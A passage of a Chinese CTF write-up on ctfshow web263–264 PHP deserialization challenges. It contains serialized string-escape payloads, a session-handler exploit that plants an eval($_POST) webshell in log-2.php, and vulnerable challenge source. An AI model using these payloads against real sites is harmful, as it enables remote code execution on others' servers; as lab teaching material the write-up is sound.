data-num=\"24\"></td><td><pre>Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxMzY6IjFsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVUiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30=</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>O%3A7%3A%22message%22%3A4%3A%7Bs%3A4%3A%22from%22%3Bs%3A1%3A%221%22%3Bs%3A3%3A%22msg%22%3Bs%3A1%3A%221%22%3Bs%3A2%3A%22to%22%3Bs%3A136%3A%221fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>136</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>*/</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304125625217.png\" alt=\"image-20230304125625217\" /></p>\n<h2 id=\"web263\"><a class=\"anchor\" href=\"#web263\">#</a> web263</h2>\n<p>这题考察的是 Session 反序列化，扫描目录能拿到 www.zip 文件</p>\n<p>首先是 index.php 文件</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 超过 5 次禁止登陆</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limti'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token operator\">?</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"登陆失败次数超过限制\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"limit\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p><code>$_SESSION['limit']=base64_decode($_COOKIE['limit'])</code>  来控制 session 的值</p>\n<p>在 inc.php 文件中，首先这里把 session.serialize_handler 设置为了 php, 和 index.php 不一致，可以利用来进行反序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'display_errors'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">date_default_timezone_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Asia/Shanghai\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">use</span> <span class=\"token package\"><span class=\"token punctuation\">\\</span>CTFSHOW<span class=\"token punctuation\">\\</span>CTFSHOW</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">require_once</span> <span class=\"token string single-quoted-string\">'CTFSHOW.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CTFSHOW</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string single-quoted-string\">'database_type'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'mysql'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token string single-quoted-string\">'database_name'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'web'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token string single-quoted-string\">'server'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string single-quoted-string\">'charset'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'utf8'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token string single-quoted-string\">'port'</span> <span class=\"token operator\">=></span> <span class=\"token number\">3306</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string single-quoted-string\">'prefix'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token string single-quoted-string\">'option'</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">ATTR_CASE</span> <span class=\"token operator\">=></span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">CASE_NATURAL</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">//sql 注入检查</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkForm</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\\`|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\\|\\&amp;|\\*|\\(|\\)|\\（|\\）|\\+|\\=|\\[|\\]|\\;|\\:|\\'|\\\"|\\&lt;|\\,|\\>|\\?/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">status</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"log-\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"使用\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"登陆\"</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">status</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"成功\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"失败\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"----\"</span><span class=\"token operator\">.</span><span class=\"token function\">date_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d H:i:s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">/* 生成唯一标志</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>* 标准的 UUID 格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx (8-4-4-4-12)</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">function</span>  <span class=\"token function-definition function\">uuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token variable\">$chars</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">uniqid</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token variable\">$uuid</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$chars</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'-'</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            <span class=\"token operator\">.</span> <span class=\"token function\">substr</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$chars</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'-'</span> </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token operator\">.</span> <span class=\"token function\">substr</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$chars</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'-'</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            <span class=\"token operator\">.</span> <span class=\"token function\">substr</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$chars</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'-'</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token operator\">.</span> <span class=\"token function\">substr</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$chars</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token variable\">$uuid</span> <span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里可以反序列化后可以写文件</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'2.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;?php phpinfo();eval($_POST[1]);?>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span>  <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token operator\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIyLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWzFdKTs/PiI7fQ==</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183010822.png\" alt=\"image-20230304183010822\" /></p>\n<p>然后访问一下 check.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183043807.png\" alt=\"image-20230304183043807\" /></p>\n<p>最后访问 log-2.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183112672.png\" alt=\"image-20230304183112672\" /></p>\n<h2 id=\"web264\"><a class=\"anchor\" href=\"#web264\">#</a> web264</h2>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'m'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$t</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token variable\">$umsg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$umsg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your message has been sent'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>message.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token 